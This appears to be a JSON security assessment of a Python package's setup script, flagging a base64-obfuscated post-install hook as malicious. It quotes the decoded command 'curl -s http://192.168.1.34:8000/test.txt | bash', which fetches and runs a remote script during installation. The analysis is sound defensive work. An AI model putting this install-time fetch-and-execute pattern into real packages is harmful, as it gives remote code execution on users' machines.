{
  "purpose": "This setup script appears to configure a Python package with potentially malicious post-install behavior.",
  "sources": "The function 'notmalfunc' executes a system command decoded from base64, which is triggered during installation via the 'AfterInstall' class.",
  "sinks": "The os.system call executes arbitrary shell command decoded from base64, which could lead to network activity or other malicious actions.",
  "flows": "During package installation, the 'notmalfunc' function is invoked, decoding base64 and executing the command 'curl -s http://192.168.1.34:8000/test.txt | bash', leading to potential remote code execution.",
  "anomalies": "Use of base64 encoding to hide the nature of the system command, dynamic execution of external code, and triggering during install phase suggest malicious intent. No clear documentation or user notification about this behavior.",
  "analysis": "The code defines a function 'b64d' to decode base64-encoded strings into executable code. The 'notmalfunc' function uses this to decode a command that fetches a script from a remote server and executes it via 'bash'. This function is invoked during the 'install' process via the 'AfterInstall' class, which extends setuptools' install command. The command executed ('curl ... | bash') is a common technique to run remote scripts, indicating potential malicious activity. The presence of base64 encoding to obfuscate the command and its execution during package installation strongly suggests malicious behavior. No other suspicious code or hardcoded secrets are present; the primary concern is remote code execution triggered automatically upon package installation.",
  "conclusion": "The package contains malicious behavior: it decodes and executes a remote script during installation, which could compromise systems. The use of obfuscation and execution of external code indicates malicious intent. It should not be used.",
